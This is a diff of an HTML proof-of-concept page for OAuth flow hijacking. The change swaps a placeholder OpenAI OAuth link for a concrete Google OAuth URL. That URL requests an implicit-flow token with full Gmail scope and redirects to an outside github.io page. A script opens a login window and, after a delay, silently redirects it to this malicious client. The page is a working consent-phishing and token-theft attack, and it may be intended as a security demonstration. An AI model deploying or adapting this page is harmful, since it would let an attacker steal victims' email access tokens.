@@ -1,21 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>OAuth Flow Hijack PoC</title>
+  <title>OAuth Hijack Test</title>
 </head>
 <body>
-  <h2>Click below to authenticate</h2>
-  <button id="startAttack">Start Attack</button>
+  <h2>OAuth Flow Hijack PoC</h2>
+  <button onclick="launch()">Start Attack</button>
 
   <script>
-    const maliciousOAuthUrl = "https://auth.openai.com/oauth/authorize?" +
-      "client_id=YOUR_OPENAI_CLIENT_ID" +
-      "&redirect_uri=https%3A%2F%2Fyourdomain.github.io%2Fredirect.html" +
-      "&response_type=token&scope=openid+email";
-
-    document.getElementById("startAttack").addEventListener("click", function () {
-      window.open(maliciousOAuthUrl, "_blank", "width=900,height=700");
-    });
+    const loginTarget = ""
+    const maliciousOAuthUrl = "https://accounts.google.com/o/oauth2/v2/auth?client_id=870583892774-o38qbckfb9vom8s7np3vqcb74cecjc3m.apps.googleusercontent.com&redirect_uri=https://zonia-bad.github.io/oauth-hijack-demo/redirect.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F";
+    function launch() {
+      const win = window.open(loginTarget, "_blank", "width=900,height=700");
+      setTimeout(() => {
+        try {
+          win.location.replace(maliciousOAuthUrl);
+          console.log("Redirected login window to malicious OAuth client.");
+        } catch (err) {
+          console.warn("Window manipulation blocked:", err);
+        }
+      }, 3000);
+    }
   </script>
 </body>
 </html>
